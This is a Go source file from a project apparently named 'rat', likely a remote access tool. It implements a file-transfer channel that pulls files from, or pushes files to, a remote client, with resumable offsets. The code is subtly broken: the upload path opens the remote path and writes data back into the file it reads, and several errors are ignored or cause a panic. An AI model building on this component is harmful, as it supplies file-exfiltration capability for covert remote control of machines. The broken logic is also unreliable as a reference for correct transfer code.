package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"rat/shared"
	"rat/shared/network/header"
)

type ChannelTransfer struct {
	Transfer *Transfer
}

func (ChannelTransfer) Header() header.PacketHeader {
	return header.ChannelTransferHeader
}

func (ch ChannelTransfer) Open(r io.ReadWriteCloser, c *Client) error {
	var fp *os.File
	var err error

	if ch.Transfer.Download {
		fp, err = os.Create(ch.Transfer.Local)
	} else {
		fp, err = os.Open(ch.Transfer.Local)
	}

	binary.Write(r, binary.LittleEndian, ch.Transfer.Download)
	binary.Write(r, binary.LittleEndian, ch.Transfer.Offset)
	shared.WriteString(r, ch.Transfer.Remote)

	if ch.Transfer.Download {
		fp, err = os.OpenFile(ch.Transfer.Local, os.O_RDWR|os.O_CREATE, 0666)
		if err != nil {
			panic(err)
		}

		if ch.Transfer.Offset > 0 {
			_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
			if err != nil {
				panic(err)
			}
		}

		b := make([]byte, 1024<<3)
		for err == nil {
			var n int
			n, err = r.Read(b)
			fp.Write(b[:n])
			fmt.Println(err)
		}
	} else {
		fp, err = os.Open(ch.Transfer.Remote)
		if err != nil {
			panic(err)
		}

		if ch.Transfer.Offset > 0 {
			_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
			if err != nil {
				panic(err)
			}
		}

		b := make([]byte, 1024<<3)
		for err == nil {
			var n int
			n, err = fp.Read(b)
			fp.Write(b[:n])
		}
	}

	fp.Sync()
	fp.Close()

	return nil
}
